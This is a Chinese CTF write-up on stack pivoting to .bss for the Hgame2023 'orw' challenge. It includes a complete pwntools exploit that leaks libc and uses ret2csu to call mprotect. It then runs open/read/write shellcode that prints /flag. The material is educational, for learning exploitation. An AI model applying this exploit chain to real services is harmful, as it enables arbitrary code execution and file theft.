    原理

    栈溢出的字节太少的时候，可以考虑把esp, ebp迁移到bss上。最少溢出3个地址单元就能完成。

    例题：Hgame2023 week1 orw

    ssize_t vuln()
{
  char buf[256]; // [rsp+0h] [rbp-100h] BYREF

  return read(0, buf, 0x130uLL);
}

    题目需要orw。可以溢出0x28个字节也就是8个地址单元。所以正常解法可以在栈迁移前先用puts泄露libc。这里提供只溢出3地址单元的方法。

    需要3次写，第一次写到栈上，完成bp的迁移；第二次写到hijack_addr上调用puts泄露libc，并用ret2csuread准备第三次写，并且写好hijack_addr+buf_size让sp迁移到hijack_addr上；第三次写到hijack_addr+buf_size，调用mprotect，返回到shellcode上。另外由于ret2csu的时候bp会被弹到0x0的位置，所以不好控制sp，这里我用的方法是用ret这个指令一直滑到hijack_addr+buf_size上。

    （小声：其实如果泄露了libc就不用ret2libc了hh）

    from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
# sh=gdb.debug('./vuln','b read\nc\nb * 0x401379\nc\nc',env={'LD_PRELOAD': './libc-2.31.so'})
sh = process('./vuln', env={'LD_PRELOAD': './libc-2.31.so'})
# gdb.attach(sh,'b puts')
# pause(1)
# sh = remote('week-1.hgame.lwsec.cn', 31740)
elf = ELF('./vuln')
libc = ELF('./libc-2.31.so')

hijack_addr = 0x404500
vuln_read_addr = 0x4012CF
buf_size = 0x100
pop_rdi_ret_addr = 0x0000000000401393
leave_ret_addr = 0x4012EE
ret_addr = 0x401394

csu_end_addr = 0x401386
csu_front_addr = 0x401370


def csu(rbx, rbp, r12, r13, r14, r15, last, mprotect_addr):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should not be 0, enable not to jump
    # r15 should be the function we want to call
    # rdi=edi=r12d
    # rsi=r13
    # rdx=r14

    payload = p64(mprotect_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'b' * 0x38
    payload += p64(last)
    return payload


payload = 'a' * buf_size + flat([
    hijack_addr + buf_size,
    vuln_read_addr,
    hijack_addr + buf_size
])
payload = payload.ljust(0x130, '\x00')
sh.sendafter('task.\n', payload)

payload = flat([
    hijack_addr + buf_size,
    pop_rdi_ret_addr,
    elf.got['puts'],
    elf.plt['puts'],
])
payload += p64(csu_end_addr) + csu(0, 1, 0, hijack_addr + buf_size, 0x130, elf.got['read'], ret_addr,
                                   0)  # read(0,hijack_addr,0x130) rdi, rsi, rdx
# payload = payload.ljust(0x100, '\x00')
payload += flat([p64(ret_addr)] * 11)
payload += flat([
    hijack_addr,
    leave_ret_addr
])
payload = payload.ljust(0x130, '\x00')
sh.send(payload)
libc_base = u64(sh.recvuntil('\n', drop=True).ljust(8, '\x00')) - libc.sym['puts']
success('libc_base = ' + str(hex(libc_base)))

mprotect_addr = libc_base + libc.sym['mprotect']
shellcode_addr = hijack_addr + buf_size + 136
payload = p64(csu_end_addr) + csu(0, 1, 0x404000, 0x1000, 7, hijack_addr + buf_size + 8, shellcode_addr,
                                  mprotect_addr)  # mprotect(0x404000,0x1000,7)
shellcode = asm(shellcraft.open("/flag"))  # fd=3
shellcode += asm(shellcraft.read(3, 0x404600, 100))
shellcode += asm(shellcraft.write(1, 0x404600, 100))
payload += shellcode
payload = payload.ljust(0x130, '\x00')
sh.send(payload)
print(sh.recv())
